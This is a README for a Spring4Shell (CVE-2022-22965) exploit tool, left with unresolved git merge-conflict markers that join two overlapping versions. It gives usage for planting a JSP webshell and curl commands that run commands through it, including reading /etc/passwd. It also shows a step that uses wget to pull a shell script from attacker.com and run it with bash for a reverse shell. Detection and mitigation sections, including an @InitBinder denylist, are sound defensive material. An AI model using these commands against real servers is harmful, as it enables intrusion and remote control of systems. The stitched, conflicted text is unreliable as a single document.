<<<<<<< HEAD
<<<<<<< HEAD
Spring4Shell CVE-2022-22965
===========================

**Author:**    Hyperion Gray Security Team  
**Date:**      2024-12-15  
**CVE:**       [CVE-2022-22965](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)  
**Advisory:**  https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement  
**Tested on:** Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19, and older versions  

Discussion
----------

Spring4Shell is a critical remote code execution vulnerability in the Spring Framework. The vulnerability allows attackers to achieve RCE via data binding when the application runs on Java 9 or later.

The exploit works by abusing Spring's data binding mechanism and accessing the class loader to write a malicious JSP file to the web server. This vulnerability affects:
- Spring Framework versions 5.3.0 to 5.3.17
- Spring Framework versions 5.2.0 to 5.2.19  
- Older unsupported versions

Requirements:
- JDK 9 or higher
- Apache Tomcat as the servlet container
- Spring MVC or Spring WebFlux application
- Application packaged as a traditional WAR (not Spring Boot executable JAR)

## Prerequisites

- Python 3.x
- Required Python packages (see requirements.txt)
- Target running vulnerable Spring Framework application

## Installation

Install dependencies:

    $ pip install -r requirements.txt

## Usage

### Basic Exploitation

Run the exploit against a vulnerable target:

    $ python3 exploit.py --url http://target:8080/vulnerable-app

This will:
1. Attempt to write a webshell to the target
2. Verify the webshell was created
3. Provide instructions for accessing the shell

### Advanced Options

Specify custom webshell path and filename:

    $ python3 exploit.py --url http://target:8080/app --shell-path /tmp --shell-name shell.jsp

Test if a target is vulnerable without exploitation:

    $ python3 exploit.py --url http://target:8080/app --check-only

### Accessing the Webshell

Once the exploit succeeds, access the webshell at:

    http://target:8080/app/shell.jsp?cmd=whoami

You can execute arbitrary commands via the `cmd` parameter:

    $ curl 'http://target:8080/app/shell.jsp?cmd=id'
    $ curl 'http://target:8080/app/shell.jsp?cmd=cat%20/etc/passwd'

## How It Works

The vulnerability exploits Spring's parameter binding mechanism:

1. Spring automatically binds HTTP request parameters to Java object properties
2. All Java objects inherit from `Object`, which provides access to the class loader
3. By carefully crafting request parameters, we can access the class loader
4. We modify the access log configuration to write arbitrary files
5. This allows writing a JSP webshell to the web application directory

The exploit chain:
```
HTTP Parameter → Spring Binding → Class Loader Access → Log Configuration → File Write → RCE
```

## Mitigation

- Upgrade to Spring Framework 5.3.18+ or 5.2.20+
- Upgrade to Spring Boot 2.6.6+ or 2.5.12+
- Downgrade to Java 8 (not recommended as a long-term solution)
- Add `@InitBinder` to disallow access to certain properties
- Implement a web application firewall with Spring4Shell rules

## Security Notice

**This is for educational and authorized penetration testing purposes only.**
Using this exploit against systems without explicit permission is illegal.

## References

- https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement
- https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/
- https://tanzu.vmware.com/security/cve-2022-22965
=======
=======
>>>>>>> origin/master
Spring4Shell (CVE-2022-22965)
==============================

**Original Discovery:** VMware Tanzu Security Team, Rapid7  
**Adapted by:**         Hyperion Gray Security Research Team  
**Date:**               2022-03-31 (discovery) / 2024-11-16 (adaptation)  
**CVE:**                [CVE-2022-22965](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)  
**CVSS Score:**         9.8 (Critical)  
**Advisory:**           https://spring.io/security/cve-2022-22965  
**Tested on:**          Spring Framework 5.3.17 on Apache Tomcat 9

Overview
--------

CVE-2022-22965, known as "Spring4Shell" or "SpringShell", is a critical remote code
execution vulnerability in the Spring Framework, one of the most popular Java application
frameworks in enterprise environments. The vulnerability allows unauthenticated attackers
to upload and execute malicious JSP webshells on vulnerable servers.

The vulnerability exploits Spring Framework's data binding mechanism to modify Apache
Tomcat's AccessLogValve configuration. By manipulating internal Java objects through
specially crafted HTTP requests, attackers can control where Tomcat writes its access
logs, what content those logs contain, and what file extension they use. This allows
writing executable JSP files to the web application's root directory.

Affected Versions
----------------

**Vulnerable Spring Framework versions:**
- Spring Framework 5.3.0 through 5.3.17
- Spring Framework 5.2.0 through 5.2.19
- Older unsupported versions are also affected

**Additional requirements for exploitation:**
- Deployed as a WAR file on Apache Tomcat (not standalone JAR)
- Running on Java JDK 9 or higher
- Using `spring-webmvc` or `spring-webflux` dependencies
- Using Spring's parameter binding on objects

**Patched versions:**
- Spring Framework 5.3.18+
- Spring Framework 5.2.20+
- Spring Boot 2.6.6+ and 2.5.12+ (when using affected Spring versions)

Technical Details
----------------

The vulnerability chain works as follows:

1. **Class Loader Access**: Spring's data binding allows access to `getClass()` on bound
   objects, providing access to the class loader and its properties.

2. **Tomcat Manipulation**: Through the class loader, attackers can access Tomcat's
   internal structures, specifically the `AccessLogValve` configuration.

3. **Log Configuration Abuse**: By setting specific properties on the AccessLogValve:
   - `pattern`: Sets the log content (contains JSP webshell code)
   - `suffix`: Sets the file extension to `.jsp`
   - `directory`: Sets where the log file is written (webapps/ROOT)
   - `prefix`: Sets the filename
   - `fileDateFormat`: Cleared to make filename predictable

4. **File Creation**: When the next HTTP request is logged, Tomcat writes the malicious
   JSP file to the specified location with attacker-controlled content.

5. **Code Execution**: The JSP file can be accessed directly through the web server,
   executing arbitrary Java code.

Installation
-----------

Install required dependencies:

```bash
pip install requests
```

Usage
-----

### Basic Exploitation

Exploit a vulnerable Spring application to upload a webshell:

```bash
# Basic exploitation with random shell name
python exploit.py -t http://target.com:8080/app/

# Specify custom shell name
python exploit.py -t http://target.com:8080/app/ -n customshell

# Specify custom directory (if different from default)
python exploit.py -t http://target.com:8080/app/ -d webapps/myapp
```

### Testing Uploaded Shell

After successful exploitation, test the webshell:

```bash
# Execute a test command during exploitation
python exploit.py -t http://target.com:8080/app/ -c whoami

# Manually test the webshell
curl "http://target.com:8080/app/shell_xxxx.jsp?cmd=whoami"
curl "http://target.com:8080/app/shell_xxxx.jsp?cmd=id"
curl "http://target.com:8080/app/shell_xxxx.jsp?cmd=ls+-la"
```

### Attack Scenario Example

1. Identify a vulnerable Spring application:
   - Check for Spring Framework version in error messages or headers
   - Confirm it's deployed as WAR on Tomcat
   - Verify Java 9+ is in use

2. Run the exploit:
```bash
python exploit.py -t http://vulnerable-app.com:8080/hello/ -c whoami
```

3. Use the uploaded webshell:
```bash
# The exploit will display the shell URL
# Execute commands by accessing the URL with cmd parameter
curl "http://vulnerable-app.com:8080/hello/shell_a1b2c3d4.jsp?cmd=cat%20/etc/passwd"
```

4. Optional: Upgrade to interactive shell
```bash
# Use the webshell to download and execute a reverse shell payload
curl "http://vulnerable-app.com:8080/hello/shell_a1b2c3d4.jsp?cmd=wget%20http://attacker.com/shell.sh"
curl "http://vulnerable-app.com:8080/hello/shell_a1b2c3d4.jsp?cmd=bash%20shell.sh"
```

Detection
---------

Vulnerable applications can be detected by:

1. **HTTP Traffic Patterns**:
   - POST requests with unusual parameter names containing "class.module.classLoader"
   - Multiple parameters trying to access internal Java objects

2. **File System Changes**:
   - Unexpected JSP files in webapps directories
   - Access logs with JSP code content
   - Modified Tomcat AccessLogValve configuration

3. **Network Signatures**:
   - Look for HTTP parameters matching exploitation patterns
   - Monitor for parameter names like `class.module.classLoader.resources.context.parent.pipeline`

4. **Application Logs**:
   - Warning messages about unexpected property access
   - Errors related to data binding on restricted properties

Mitigation
----------

### Immediate Actions

1. **Upgrade Spring Framework**:
   - Spring Framework 5.3.18 or later
   - Spring Framework 5.2.20 or later
   - Spring Boot 2.6.6 or 2.5.12 or later

2. **Apply Workarounds** (if upgrade not immediately possible):
   - Downgrade to Java 8 (not affected due to different module system)
   - Add `@InitBinder` to controllers to disallow dangerous patterns:
   ```java
   @InitBinder
   public void initBinder(WebDataBinder binder) {
       String[] denylist = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};
       binder.setDisallowedFields(denylist);
   }
   ```

3. **Network Controls**:
   - Deploy Web Application Firewall (WAF) rules to block exploitation attempts
   - Monitor and block POST requests with `class.module.classLoader` parameters
   - Restrict access to management interfaces

4. **Runtime Protection**:
   - Enable Java Security Manager (if feasible)
   - Implement strict input validation
   - Use Content Security Policy headers

### Long-term Recommendations

- Implement automated dependency scanning in CI/CD
- Use Software Composition Analysis (SCA) tools
- Keep all frameworks and libraries updated
- Follow secure coding practices for parameter binding
- Implement defense-in-depth security architecture
- Regular security assessments and penetration testing

Real-World Impact
----------------

Spring4Shell has significant real-world impact:
- Affects countless enterprise applications worldwide
- Spring is one of the most popular Java frameworks
- Similar naming and timing to Log4Shell caused confusion and panic
- Actively exploited by threat actors for cryptomining and botnet deployment
- CISA added to Known Exploited Vulnerabilities catalog

Differences from Spring Cloud Gateway CVE-2022-22947:
- CVE-2022-22965 (Spring4Shell): Affects core Spring Framework
- CVE-2022-22947: Affects Spring Cloud Gateway specifically

References
----------

- [Spring Security Advisory](https://spring.io/security/cve-2022-22965)
- [Rapid7 Analysis](https://www.rapid7.com/blog/post/2022/03/30/spring4shell-zero-day-vulnerability-in-spring-framework/)
- [Microsoft Detection Guidance](https://www.microsoft.com/en-us/security/blog/2022/04/04/springshell-rce-vulnerability-guidance-for-protecting-against-and-detecting-cve-2022-22965/)
- [Praetorian Technical Analysis](https://www.praetorian.com/blog/spring-core-jdk9-rce/)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)
- [VMware Tanzu Blog](https://tanzu.vmware.com/security/cve-2022-22965)

Legal Notice
-----------

This exploit is provided for educational and authorized penetration testing purposes only.
Unauthorized access to computer systems is illegal. Always obtain explicit written
permission before testing any system you do not own. The authors and contributors
are not responsible for misuse of this tool.
<<<<<<< HEAD
>>>>>>> bf9bc6c (Add three modern ExploitDB-based exploits: PHP CGI, Log4Shell, and Spring4Shell)
=======
>>>>>>> origin/master
